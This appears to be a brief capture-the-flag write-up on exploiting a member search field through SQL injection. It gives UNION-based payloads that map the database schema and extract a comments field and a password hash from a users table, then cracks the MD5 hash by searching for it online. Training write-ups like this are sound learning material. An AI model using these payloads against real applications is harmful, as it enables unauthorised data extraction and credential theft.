In the member search page, you can see members infos by typing a number in the text field.

I tried to get all informations with an UNION and a request after:

1 UNION select table_name, column_name FROM information_schema.columns

Then I have all of the DB architechture and I cmd+f to find interestings keywords.

There was the "commentaire" field wich was interesting, I tried it with this query:
1 UNION select Commentaire, first_name from users 

And one result was interesting:
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : Flag

But I don't had the password, so I then tried with all the columns in the table users and finaly found it with this query:
1 UNION select Commentaire, countersign from users

And the result:
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

I then searched the password and google and found that it was "FortyTwo" hashed with MD5.

I hashed "fortytwo" with sha256 and then got the flag
